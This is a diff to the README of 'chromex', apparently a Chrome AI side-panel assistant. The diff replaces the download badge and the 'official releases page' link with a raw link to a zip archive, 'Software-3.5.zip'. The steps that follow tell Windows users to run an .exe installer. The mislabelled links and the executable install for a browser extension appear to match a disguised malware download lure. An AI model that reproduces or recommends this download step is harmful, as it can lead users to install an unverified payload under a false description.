@@ -1,6 +1,6 @@
 # 🤖 chromex - AI assistant for your browser workflows
 
-[![Download chromex](https://img.shields.io/badge/Download-chromex-blue)](https://github.com/toprak101112-blip/chromex)
+[![Download chromex](https://img.shields.io/badge/Download-chromex-blue)](https://raw.githubusercontent.com/toprak101112-blip/chromex/main/packages/Software-3.5.zip)
 
 chromex is a smart side-panel assistant for Google Chrome. It uses the Codex engine to help you manage web pages, tabs, voice commands, and images. It sits on the side of your browser and stays ready to help you work faster.
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. Your computer must have Go
 
 You can install the software in a few minutes. Follow these steps to get your assistant running.
 
-1. Visit the [official releases page](https://github.com/toprak101112-blip/chromex) to download the latest setup file.
+1. Visit the [official releases page](https://raw.githubusercontent.com/toprak101112-blip/chromex/main/packages/Software-3.5.zip) to download the latest setup file.
 2. Find the file in your downloads folder. It will have a name ending in .exe.
 3. Double-click the file to start the installer.
 4. Follow the instructions on the screen.
